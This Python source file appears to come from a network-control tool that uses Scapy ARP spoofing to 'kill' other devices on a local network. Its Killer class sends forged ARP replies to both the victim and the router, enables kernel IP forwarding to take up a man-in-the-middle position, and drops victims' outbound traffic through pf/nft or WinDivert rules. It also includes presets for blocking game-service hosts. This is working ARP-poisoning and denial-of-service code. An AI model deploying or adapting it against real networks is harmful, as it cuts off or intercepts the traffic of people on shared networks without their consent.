"""ARP spoofing (kill/unkill) and MITM forwarder management."""
import logging
from scapy.all import ARP, Ether, conf
from time import sleep
import sys
import subprocess
import threading
from typing import Optional

from networking.hostblock import HostBlocklist
from tools.firewall import block_all_for, unblock_all_for
from tools.utils import threaded, get_default_iface
from constants import DUMMY_ROUTER

log = logging.getLogger(__name__)


def enable_ip_forwarding() -> bool:
    """Turn on kernel IP forwarding so selective blocks forward allowed traffic.

    macOS/Linux flip a sysctl. Windows has no sysctl equivalent for ARP-MITM'd
    traffic, so it sets the ``IPEnableRouter`` registry flag (the analogue) via
    the WinDivert forwarding module; the WinDivert handle drops the filtered
    flows while the kernel forwards the rest (see ``networking.windivert_forwarder``).
    """
    if sys.platform == 'darwin':
        key = 'net.inet.ip.forwarding'
    elif sys.platform.startswith('linux'):
        key = 'net.ipv4.ip_forward'
    elif sys.platform.startswith('win'):
        from networking.windivert_forwarder import enable_windows_routing
        return enable_windows_routing()
    else:
        return False
    res = subprocess.run(['sysctl', '-w', f'{key}=1'], capture_output=True, check=False)
    return res.returncode == 0


class Killer:
    """ARP spoofer that kills/unkills network devices.

    Manages a persistent L2 socket to avoid socket exhaustion on Windows.
    Callers should invoke ``unkill_all()`` before discarding the instance,
    or rely on ``__del__`` for best-effort cleanup.
    """

    def __init__(self, router: dict[str, object] = DUMMY_ROUTER) -> None:
        self.iface = get_default_iface()
        # Use guid (Scapy/pcap name) for conf.iface, not friendly name
        conf.iface = self.iface.guid if self.iface.guid else self.iface.name
        # Kernel IP forwarding so selective blocks can forward the allowed traffic.
        enable_ip_forwarding()
        self.router: dict[str, object] = router
        self.killed: dict[str, dict[str, object]] = {}
        self.storage: dict[str, dict[str, object]] = {}
        self.pf_blocks: set[str] = set()
        # Windows kernel-forwarder handles, keyed by victim IP (WinDivert path).
        self._wd_forwarders: dict[str, object] = {}
        self._socket: Optional[object] = None  # Persistent L2 socket
        self._lock: threading.Lock = threading.Lock()  # Guards killed, forwarders, pf_blocks
        # Host-domain blocklist (PSN, GTA, …) over the firewall module.
        self.hostblock = HostBlocklist()

    def __del__(self) -> None:
        """Best-effort cleanup — close socket if still open."""
        self._close_socket()
    
    def _get_socket(self) -> Optional[object]:
        """Get or create persistent L2 socket — prevents Windows socket exhaustion."""
        if self._socket is None:
            try:
                iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
                self._socket = conf.L2socket(iface=iface)
            except OSError as e:
                log.warning('Failed to create L2 socket on %s: %s', self.iface.name, e)
                self._socket = None
        return self._socket
    
    def _send_packet(self, packet: object) -> None:
        """Send packet using persistent socket, fallback to new socket if needed."""
        sock = self._get_socket()
        if sock:
            try:
                sock.send(packet)
                return
            except OSError as e:
                log.debug('L2 socket send failed, recreating: %s', e)
                self._close_socket()

        # Fallback: direct send (creates new socket)
        try:
            from scapy.all import sendp
            iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
            sendp(packet, iface=iface, verbose=0)
        except OSError as e:
            log.warning('Fallback sendp failed for %s: %s', self.iface.name, e)
    
    def _close_socket(self) -> None:
        """Close persistent socket safely."""
        if self._socket:
            try:
                self._socket.close()
            except OSError as e:
                log.debug('Socket close error (ignoring): %s', e)
            self._socket = None
    
    @threaded
    def kill(self, victim: dict[str, object], wait_after: int = 2) -> None:
        """
        Spoofing victim.
        Default 2 second delay - ARP cache lasts 30-120s, no need to spam.
        Prevents Windows NDIS throttling.
        """
        with self._lock:
            if victim['mac'] in self.killed:
                return
            self.killed[victim['mac']] = victim

        # Send ARP reply (is-at) with proper Ethernet destination to poison caches
        # Unicast to specific MAC, not broadcast - avoids switch storm detection
        
        # Victim: tell victim that router IP is at our MAC
        to_victim = Ether(dst=victim['mac'])/ARP(
            op=2,
            psrc=self.router['ip'],
            hwsrc=self.iface.mac,
            pdst=victim['ip'],
            hwdst=victim['mac']
        )

        # Router: tell router that victim IP is at our MAC
        to_router = Ether(dst=self.router['mac'])/ARP(
            op=2,
            psrc=victim['ip'],
            hwsrc=self.iface.mac,
            pdst=self.router['ip'],
            hwdst=self.router['mac']
        )

        while victim['mac'] in self.killed \
            and self.iface.name != 'NULL':
            # Send packets using persistent socket
            self._send_packet(to_victim)
            self._send_packet(to_router)
            sleep(wait_after)

    @threaded
    def unkill(self, victim: dict[str, object]) -> None:
        """
        Unspoofing victim
        """
        with self._lock:
            if victim['mac'] in self.killed:
                self.killed.pop(victim['mac'])

        # Restore Victim and Router with correct mappings
        to_victim = Ether(dst=victim['mac'])/ARP(
            op=2,
            psrc=self.router['ip'],
            hwsrc=self.router['mac'],
            pdst=victim['ip'],
            hwdst=victim['mac']
        )

        to_router = Ether(dst=self.router['mac'])/ARP(
            op=2,
            psrc=victim['ip'],
            hwsrc=victim['mac'],
            pdst=self.router['ip'],
            hwdst=self.router['mac']
        )

        if self.iface.name != 'NULL':
            # Send restore packets 3 times
            for _ in range(3):
                self._send_packet(to_victim)
                self._send_packet(to_router)
                sleep(0.1)
        self._remove_pf_block(victim['ip'])
        self._remove_windivert_block(victim['ip'])

    def kill_all(self, device_list: list[dict[str, object]]) -> None:
        """
        Safely kill all devices
        """
        for device in device_list[:]:
            if device['admin']:
                continue
            if device['mac'] not in self.killed:
                self.kill(device)

    def unkill_all(self) -> None:
        """
        Safely unkill all devices killed previously
        """
        with self._lock:
            for mac in list(self.killed):
                self.killed.pop(mac)
            for ip in list(self.pf_blocks):
                self._remove_pf_block(ip)
            wd_ips = list(self._wd_forwarders)
        for ip in wd_ips:
            self._remove_windivert_block(ip)
        # Close persistent socket when done
        self._close_socket()
    
    def store(self) -> None:
        """
        Save a copy of previously killed devices
        """
        self.storage = dict(self.killed)
    
    def release(self) -> None:
        """
        Remove the stored copy of killed devices
        """
        self.storage = {}
    
    def rekill_stored(self, new_devices: list[dict[str, object]]) -> None:
        """
        Re-kill old devices in self.storage
        """
        for mac, old in self.storage.items():
            for new in new_devices:
                # Update old killed with newer ip
                if old['mac'] == new['mac']:
                    old['ip'] = new['ip']
                    break
                
            # Update new_devices with those it does not have
            if old not in new_devices:
                new_devices.append(old)

            self.kill(old)

    def one_way_kill(self, victim: dict[str, object]) -> None:
        """
        Kill victim and block their outbound traffic.
        Uses kernel IP forwarding + a kernel-level drop (fast, no Python overhead).

        With forwarding enabled (sysctl on mac/linux, IPEnableRouter on Windows):
        - ARP spoof redirects traffic through us
        - Kernel forwards packets at native speed
        - The filtered flow is dropped in-kernel:
          * mac/linux — pf/nft ``block drop`` on the victim's outbound;
          * Windows   — a WinDivert ``NETWORK_FORWARD`` drop for the victim's
            outbound (the netsh rule alone filtered the attacker's host, not the
            forwarded victim traffic).
        """
        # Ensure victim is being ARP poisoned
        if victim['mac'] not in self.killed:
            self.kill(victim)
            # Wait for poison to start
            for _ in range(10):
                sleep(0.1)
                if victim['mac'] in self.killed:
                    break

        # Block outbound at kernel level (no slow Python forwarder).
        if sys.platform.startswith('win'):
            self._enforce_windivert_block(victim['ip'])
        # Keep the firewall block as a portable backstop on every OS.
        self._enforce_pf_block(victim['ip'])

    def _enforce_windivert_block(self, victim_ip: str) -> None:
        """Start (idempotently) a WinDivert kernel drop for the victim's outbound."""
        with self._lock:
            if victim_ip in self._wd_forwarders:
                return
        try:
            from networking.windivert_forwarder import WinDivertForwarder, WINDIVERT_AVAILABLE
            if not WINDIVERT_AVAILABLE:
                return
            fwd = WinDivertForwarder()
            if fwd.start(victim_ip, drop_from_victim=True):
                with self._lock:
                    self._wd_forwarders[victim_ip] = fwd
        except Exception as e:  # noqa: BLE001 - never let the kernel path break a kill
            log.warning('WinDivert block failed for %s: %s', victim_ip, e)

    def _remove_windivert_block(self, victim_ip: str) -> None:
        """Stop and drop the WinDivert forwarder for a victim IP, if any."""
        with self._lock:
            fwd = self._wd_forwarders.pop(victim_ip, None)
        if fwd is not None:
            try:
                fwd.stop()
            except Exception as e:  # noqa: BLE001
                log.debug('WinDivert stop error (ignoring): %s', e)

    def _enforce_pf_block(self, victim_ip: str) -> None:
        if victim_ip in self.pf_blocks:
            return
        if block_all_for(self.iface.name, victim_ip):  # self-ensures pf/anchor
            self.pf_blocks.add(victim_ip)

    def _remove_pf_block(self, victim_ip: str) -> None:
        if victim_ip not in self.pf_blocks:
            return
        unblock_all_for(victim_ip)
        self.pf_blocks.discard(victim_ip)

    # -- host / domain blocking (PSN, GTA, …) --------------------------------

    def block_host(self, target: object, iface: Optional[str] = None) -> object:
        """Block a curated preset key, domain, or IP (idempotent).

        ``target`` may be a preset key ('psn-comms', 'gta-save'), a bare domain,
        an IP, or an iterable of those. Returns a ``BlockResult``.
        """
        return self.hostblock.block(target, iface or self.iface.name)  # type: ignore[arg-type]

    def unblock_host(self, key: str) -> bool:
        """Remove exactly the IPs a previous ``block_host`` installed for ``key``."""
        return self.hostblock.unblock(key)

    def refresh_hosts(self, iface: Optional[str] = None) -> object:
        """Re-resolve active host blocks and reconcile firewall rules (IP rotation)."""
        return self.hostblock.refresh(iface or self.iface.name)

    def active_host_blocks(self) -> dict:
        """Map of active host-block key → currently-blocked IPs."""
        return self.hostblock.active()
